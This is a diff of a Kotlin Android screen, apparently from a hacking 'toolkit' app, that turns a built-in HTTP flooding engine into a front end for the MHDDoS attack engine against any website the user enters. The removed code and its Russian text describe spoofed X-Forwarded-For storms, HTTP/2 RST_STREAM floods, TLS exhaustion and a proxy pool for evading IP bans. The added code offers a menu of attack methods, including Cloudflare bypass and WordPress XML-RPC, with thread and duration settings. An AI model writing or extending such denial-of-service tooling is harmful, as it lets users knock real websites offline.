@@ -1,7 +1,5 @@
 package com.toolkit.app
 
-import android.os.Handler
-import android.os.Looper
 import androidx.activity.compose.BackHandler
 import androidx.compose.animation.core.RepeatMode
 import androidx.compose.animation.core.animateFloat
@@ -11,10 +9,9 @@ import androidx.compose.animation.core.tween
 import androidx.compose.foundation.Canvas
 import androidx.compose.foundation.background
 import androidx.compose.foundation.clickable
+import androidx.compose.foundation.horizontalScroll
 import androidx.compose.foundation.layout.*
 import androidx.compose.foundation.lazy.LazyColumn
-import androidx.compose.foundation.lazy.items
-import androidx.compose.foundation.lazy.rememberLazyListState
 import androidx.compose.foundation.rememberScrollState
 import androidx.compose.foundation.shape.CircleShape
 import androidx.compose.foundation.shape.RoundedCornerShape
@@ -40,6 +37,7 @@ import androidx.compose.ui.graphics.StrokeCap
 import androidx.compose.ui.graphics.StrokeJoin
 import androidx.compose.ui.graphics.drawscope.Fill
 import androidx.compose.ui.graphics.drawscope.Stroke
+import androidx.compose.ui.platform.LocalContext
 import androidx.compose.ui.text.font.FontFamily
 import androidx.compose.ui.text.font.FontWeight
 import androidx.compose.ui.text.input.ImeAction
@@ -55,9 +53,19 @@ import com.toolkit.app.ui.TextDim
 import com.toolkit.app.ui.TextMain
 import com.toolkit.app.ui.WarnOrange
 import com.toolkit.app.ui.flatButtonElevation
-import java.net.URI
 import java.text.SimpleDateFormat
 import java.util.*
+
+private val ansiStrip = Regex("\u001B\\[[0-9;]*[A-Za-z]")
+
+private val DDoS_METHODS = listOf(
+    "BYPASS", "GET", "POST", "HEAD", "CFB", "CFBUAM", "AVB",
+    "SLOW", "RHEX", "STOMP", "PPS", "KILLER", "DGB", "OVH",
+    "STRESS", "DYN", "COOKIE", "NULL", "EVEN", "GSB",
+    "APACHE", "XMLRPC", "DOWNLOADER",
+)
+
+private data class DdosLogLine(val text: String, val color: Color)
 
 @Composable
 fun DdosIcon(modifier: Modifier, color: Color, animated: Boolean = false) {
@@ -94,25 +102,23 @@ fun DdosIcon(modifier: Modifier, color: Color, animated: Boolean = false) {
 
 @Composable
 fun DdosScreen(onBack: () -> Unit) {
+    val ctx = LocalContext.current
     var url by remember { mutableStateOf("https://example.com") }
+    var method by remember { mutableStateOf("BYPASS") }
+    var threads by remember { mutableStateOf("30") }
+    var duration by remember { mutableStateOf("60") }
     var proxText by remember { mutableStateOf("") }
     var running by remember { mutableStateOf(false) }
-    var snap by remember { mutableStateOf(StresserSnapshot()) }
-    var target by remember { mutableStateOf("") }
-    val logs = remember { mutableStateListOf<LogLine>() }
+    val logs = remember { mutableStateListOf<DdosLogLine>() }
     val listState = rememberLazyListState()
-    val engine = remember { mutableStateOf<StresserEngine?>(null) }
-    var hist by remember { mutableStateOf<List<Float>?>(null) }
-    val wasDropped = remember { mutableStateOf(false) }
-    val pingSpiked = remember { mutableStateOf(false) }
-    val anim = animatedSnap(snap)
+    val outBuffer = remember { StringBuilder() }
 
     BackHandler(enabled = true, onBack = onBack)
 
     fun addLog(text: String, color: Color = TextDim) {
         val ts = SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())
-        logs.add(LogLine("[$ts] $text", color))
-        if (logs.size > 80) logs.removeAt(0)
+        logs.add(DdosLogLine("[$ts] $text", color))
+        if (logs.size > 150) logs.removeAt(0)
     }
 
     LaunchedEffect(logs.size) {
@@ -121,8 +127,8 @@ fun DdosScreen(onBack: () -> Unit) {
 
     fun stopDdos() {
         running = false
-        engine.value?.stop()
-        engine.value = null
+        TerminalIO.cancel()
+        addLog("Останавливаю…", WarnOrange)
     }
 
     fun startDdos() {
@@ -131,63 +137,51 @@ fun DdosScreen(onBack: () -> Unit) {
             addLog("Введите адрес сайта", WarnOrange)
             return
         }
-        var u = raw
-        if (!u.contains("://")) u = "https://$u"
-        val host: String
-        val port: Int
-        try {
-            val uri = URI(u)
-            val h = uri.host ?: throw IllegalArgumentException("нет хоста")
-            host = h
-            port = if (uri.port > 0) uri.port else if (uri.scheme.equals("http", true)) 80 else 443
-        } catch (t: Throwable) {
-            addLog("Некорректный адрес: $raw", WarnOrange)
-            return
-        }
+        val t = threads.trim().toIntOrNull() ?: 30
+        val d = duration.trim().toIntOrNull() ?: 60
         logs.clear()
-        wasDropped.value = false
-        pingSpiked.value = false
-        val allProxies = (parseProxies(EMBEDDED_PROXIES) + parseProxies(proxText)).distinct()
-        val ui = Handler(Looper.getMainLooper())
-        val e = StresserEngine(
-            host = host,
-            port = port,
-            withBroadcast = false,
-            proxies = allProxies,
-            onMetrics = { m ->
-                ui.post {
-                    snap = m
-                    hist = engine.value?.pingHistory
-                    if (!m.dropped) wasDropped.value = false
-                    if (m.pingMs > 2000 && !pingSpiked.value) {
-                        pingSpiked.value = true
-                        addLog("Ответы замедлились: ${m.pingMs.toInt()} мс — сайт захлёбывается", WarnOrange)
-                    } else if (m.pingMs < 800 && pingSpiked.value) {
-                        pingSpiked.value = false
-                    }
-                }
-            },
-            onLog = { text, color -> ui.post { addLog(text, color) } },
-            onDrop = {
-                ui.post {
-                    wasDropped.value = true
-                    addLog("Цель не отвечает! Сайт лёг или забанил ваш IP", Color(0xFFFF6B6B))
-                }
-            },
-        )
-        target = host
-        engine.value = e
+        outBuffer.clear()
         running = true
-        addLog("Цель: $host:$port (${if (port == 443) "HTTPS" else "HTTP"})", AccentSoft)
-        addLog(
-            if (allProxies.isNotEmpty())
-                "Прокси: ${allProxies.size} встроено — поток идёт параллельно через все, бан не остановит"
-            else
-                "Прокси: 0 — прямое соединение (добавьте прокси для обхода банов)",
-            AccentSoft,
-        )
-        addLog("Запуск: RAW HTTP + HTTP/2 RST_STREAM + TLS CPU/RAM + HEAD-шторм…", AccentSoft)
-        e.start()
+        TerminalIO.onAppend = { chunk ->
+            synchronized(outBuffer) {
+                outBuffer.append(chunk)
+                if (outBuffer.length > 300_000) outBuffer.delete(0, 150_000)
+                val text = outBuffer.toString()
+                val lines = text.split("\n")
+                if (lines.size > 1) {
+                    for (i in 0 until lines.size - 1) {
+                        val line = ansiStrip.replace(processTerminal(lines[i]).trimEnd('\r'), "")
+                        if (line.isNotBlank()) {
+                            val color = when {
+                                line.contains("ЗАПУЩЕНА") || line.contains("прокси:") -> AccentSoft
+                                line.contains("остановлено") || line.contains("завершена") -> WarnOrange
+                                line.contains("ошибк") || line.contains("не удалось") ||
+                                    line.contains("не поддерживается") -> Color(0xFFFF6B6B)
+                                else -> TextDim
+                            }
+                            logs.add(DdosLogLine(line, color))
+                            if (logs.size > 150) logs.removeAt(0)
+                        }
+                    }
+                    outBuffer.clear()
+                    outBuffer.append(lines.last())
+                }
+            }
+        }
+        TerminalIO.onFinished = {
+            running = false
+            val rest = ansiStrip.replace(
+                synchronized(outBuffer) { outBuffer.toString().trimEnd('\n', '\r') },
+                "",
+            )
+            if (rest.isNotBlank()) logs.add(DdosLogLine(rest, TextDim))
+            outBuffer.clear()
+        }
+        TerminalIO.onProgress = null
+        TerminalIO.clearInput()
+        addLog("Запуск MHDDoS: $method $raw", AccentSoft)
+        addLog("Потоков: $t · время: $d c · прокси: ${if (proxText.isBlank()) "нет (прямое соединение)" else proxText}", TextDim)
+        PythonRunner.runModule(ctx, "mhddos_launcher", listOf(raw, method, t.toString(), "1", d.toString(), proxText))
     }
 
     Column(
@@ -230,20 +224,18 @@ fun DdosScreen(onBack: () -> Unit) {
         GlassCard(modifier = Modifier.fillMaxWidth()) {
             Column(Modifier.padding(16.dp)) {
                 Text(
-                    "Жёсткий комбинированный флуд с одного устройства, без root. " +
-                        "Работает по любому сайту — https и http.",
+                    "MHDDoS — движок атак с открытым исходным кодом, встроен в приложение целиком.",
                     color = TextMain,
                     fontSize = 13.sp,
                     lineHeight = 18.sp,
                 )
                 Spacer(Modifier.height(10.dp))
                 Text(
-                    "• RAW HTTP-шторм — огромное число сырых запросов с подменой X-Forwarded-For (обход защит).\n" +
-                        "• HTTP/2 RST_STREAM — тысячи команд принудительного сброса потоков.\n" +
-                        "• TLS CPU — тяжёлая криптография RSA/ECDHE при каждом рукопожатии жжёт процессор сервера.\n" +
-                        "• TLS RAM — десятки спящих шифрованных соединений заставляют сервер держать контекст сессий.\n" +
-                        "• HEAD-шторм + POST + TCP-churn + UDP + RST — миллион методов в одном.\n" +
-                        "• Встроенный прокси-пул — парсится автоматически, атака идёт параллельно через все прокси: ваш IP не забанить.",
+                    "• BYPASS — обход Cloudflare/защит, поток сырых HTTP-запросов.\n" +
+                        "• CFB/CFBUAM — Cloudflare-флуд через cloudscraper.\n" +
+                        "• BOT — боты с куками; SLOW — медленный POST; RHEX/STOMP — случайные данные.\n" +
+                        "• PPS — пакеты-гиганты; KILLER — прицельно по CPU; XMLRPC — пинг-атака WordPress.\n" +
+                        "• Прокси (свои или встроенный пул) обходят бан по IP — Vercel и другие блокируют ваш IP, а не заголовки.",
                     color = TextDim,
                     fontSize = 12.sp,
                     lineHeight = 17.sp,
@@ -304,6 +296,91 @@ fun DdosScreen(onBack: () -> Unit) {
         }
 
         Spacer(Modifier.height(10.dp))
+        Text("Метод атаки", color = TextDim, fontSize = 12.sp)
+        Spacer(Modifier.height(6.dp))
+        Row(
+            modifier = Modifier
+                .fillMaxWidth()
+                .horizontalScroll(rememberScrollState()),
+            verticalAlignment = Alignment.CenterVertically,
+        ) {
+            DDoS_METHODS.forEach { m ->
+                val selected = m == method
+                Box(
+                    modifier = Modifier
+                        .clip(RoundedCornerShape(12.dp))
+                        .background(if (selected) Accent else Color(0x14FFFFFF))
+                        .clickable { method = m }
+                        .padding(horizontal = 12.dp, vertical = 7.dp),
+                ) {
+                    Text(
+                        m,
+                        color = if (selected) Color(0xFF0E1013) else TextDim,
+                        fontSize = 12.sp,
+                        fontWeight = if (selected) FontWeight.Bold else FontWeight.Medium,
+                        fontFamily = FontFamily.Monospace,
+                    )
+                }
+                Spacer(Modifier.width(8.dp))
+            }
+        }
+
+        Spacer(Modifier.height(10.dp))
+        GlassCard(modifier = Modifier.fillMaxWidth()) {
+            Row(Modifier.padding(14.dp)) {
+                OutlinedTextField(
+                    value = threads,
+                    onValueChange = { threads = it },
+                    modifier = Modifier.weight(1f),
+                    singleLine = true,
+                    label = { Text("Потоки", color = TextDim, fontSize = 13.sp) },
+                    textStyle = MaterialTheme.typography.bodyLarge.copy(
+                        color = TextMain,
+                        fontSize = 14.sp,
+                        fontFamily = FontFamily.Monospace,
+                    ),
+                    keyboardOptions = KeyboardOptions(
+                        keyboardType = KeyboardType.Number,
+                        imeAction = ImeAction.Next,
+                    ),
+                    shape = RoundedCornerShape(14.dp),
+                    colors = OutlinedTextFieldDefaults.colors(
+                        focusedBorderColor = Accent,
+                        unfocusedBorderColor = BorderGlass,
+                        focusedTextColor = TextMain,
+                        cursorColor = Accent,
+                        focusedLabelColor = AccentSoft,
+                    ),
+                )
+                Spacer(Modifier.width(10.dp))
+                OutlinedTextField(
+                    value = duration,
+                    onValueChange = { duration = it },
+                    modifier = Modifier.weight(1f),
+                    singleLine = true,
+                    label = { Text("Время, сек", color = TextDim, fontSize = 13.sp) },
+                    textStyle = MaterialTheme.typography.bodyLarge.copy(
+                        color = TextMain,
+                        fontSize = 14.sp,
+                        fontFamily = FontFamily.Monospace,
+                    ),
+                    keyboardOptions = KeyboardOptions(
+                        keyboardType = KeyboardType.Number,
+                        imeAction = ImeAction.Done,
+                    ),
+                    shape = RoundedCornerShape(14.dp),
+                    colors = OutlinedTextFieldDefaults.colors(
+                        focusedBorderColor = Accent,
+                        unfocusedBorderColor = BorderGlass,
+                        focusedTextColor = TextMain,
+                        cursorColor = Accent,
+                        focusedLabelColor = AccentSoft,
+                    ),
+                )
+            }
+        }
+
+        Spacer(Modifier.height(10.dp))
         GlassCard(modifier = Modifier.fillMaxWidth()) {
             Row(
                 modifier = Modifier.padding(12.dp),
@@ -340,69 +417,26 @@ fun DdosScreen(onBack: () -> Unit) {
             }
         }
 
-        if (target.isNotEmpty()) {
-            Spacer(Modifier.height(10.dp))
-            Text(
-                "Цель: $target  ·  ${
-                    if (snap.okRate > 80) "сервер держится" else if (snap.okRate > 40) "замедляется" else "падает"
-                }",
-                color = TextDim,
-                fontSize = 12.sp,
-            )
-        }
-
-        Spacer(Modifier.height(12.dp))
-        Row(Modifier.fillMaxWidth()) {
-            StatTile(Modifier.weight(1f), "Отдача", speedStr(anim.upKBs))
-            Spacer(Modifier.width(8.dp))
-            StatTile(Modifier.weight(1f), "Ответ", if (anim.pingMs > 0) "${anim.pingMs.toInt()} мс" else "—")
-            Spacer(Modifier.width(8.dp))
-            StatTile(Modifier.weight(1f), "Соединения", "${anim.liveConns}")
-            Spacer(Modifier.width(8.dp))
-            StatTile(Modifier.weight(1f), "Успех", "${snap.okRate.toInt()}%")
-        }
-
         Spacer(Modifier.height(12.dp))
         GlassCard(modifier = Modifier.fillMaxWidth()) {
             Column(Modifier.padding(14.dp)) {
                 Row(verticalAlignment = Alignment.CenterVertically) {
                     Text(
-                        "Сайт в реальном времени",
+                        "Логи",
                         color = TextMain,
                         fontSize = 14.sp,
                         fontWeight = FontWeight.SemiBold,
                     )
                     Spacer(Modifier.weight(1f))
-                    if (snap.dropped) {
-                        Text("САЙТ НЕ ОТВЕЧАЕТ", color = Color(0xFFFF6B6B), fontSize = 11.sp, fontWeight = FontWeight.Bold)
-                    } else {
+                    if (running) {
                         Text(
-                            "Успех ${snap.okRate.toInt()}%",
-                            color = if (snap.okRate > 80) OkGreen else WarnOrange,
+                            "АТАКА ИДЁТ",
+                            color = OkGreen,
                             fontSize = 11.sp,
                             fontWeight = FontWeight.Bold,
                         )
                     }
                 }
-                Spacer(Modifier.height(8.dp))
-                LatencyGraph(hist)
-                Spacer(Modifier.height(4.dp))
-                Row {
-                    Box(Modifier.size(8.dp).clip(CircleShape).background(Accent))
-                    Spacer(Modifier.width(6.dp))
-                    Text("время ответа", color = TextDim, fontSize = 11.sp)
-                    Spacer(Modifier.width(14.dp))
-                    Box(Modifier.size(8.dp).clip(CircleShape).background(Color(0xFFFF6B6B)))
-                    Spacer(Modifier.width(6.dp))
-                    Text("нет ответа — сайт лежит", color = TextDim, fontSize = 11.sp)
-                }
-            }
-        }
-
-        Spacer(Modifier.height(12.dp))
-        GlassCard(modifier = Modifier.fillMaxWidth()) {
-            Column(Modifier.padding(14.dp)) {
-                Text("Логи", color = TextMain, fontSize = 14.sp, fontWeight = FontWeight.SemiBold)
                 Spacer(Modifier.height(6.dp))
                 if (logs.isEmpty()) {
                     Text(
@@ -415,7 +449,7 @@ fun DdosScreen(onBack: () -> Unit) {
                         state = listState,
                         modifier = Modifier
                             .fillMaxWidth()
-                            .height(180.dp),
+                            .height(220.dp),
                     ) {
                         items(logs.size) { i ->
                             val l = logs[i]
